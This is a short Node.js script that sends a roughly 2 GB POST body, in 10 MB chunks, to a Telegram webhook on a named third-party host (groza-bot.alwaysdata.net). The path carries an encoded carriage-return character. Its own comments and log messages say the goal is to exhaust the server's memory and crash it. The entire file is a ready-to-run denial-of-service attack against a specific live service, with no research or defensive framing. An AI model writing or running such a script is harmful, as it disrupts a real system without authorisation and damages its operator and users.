const http = require('http');
const https = require('https');

const req = https.request({
  hostname: 'groza-bot.alwaysdata.net',
  path: '/api/telegram-webhook-8516017309%0D',
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  }
}, (res) => {
  console.log('Status:', res.statusCode);
  res.on('data', (d) => process.stdout.write(d));
});

req.on('error', (e) => {
  console.error('Request error (likely crashed!):', e.message);
});

console.log('Sending huge payload to cause OOM...');
const chunk = Buffer.alloc(1024 * 1024 * 10, 'A'); // 10MB chunk
for (let i = 0; i < 200; i++) { // 200 * 10MB = 2GB
  req.write(chunk);
}
req.end();
console.log('Finished writing 2GB');
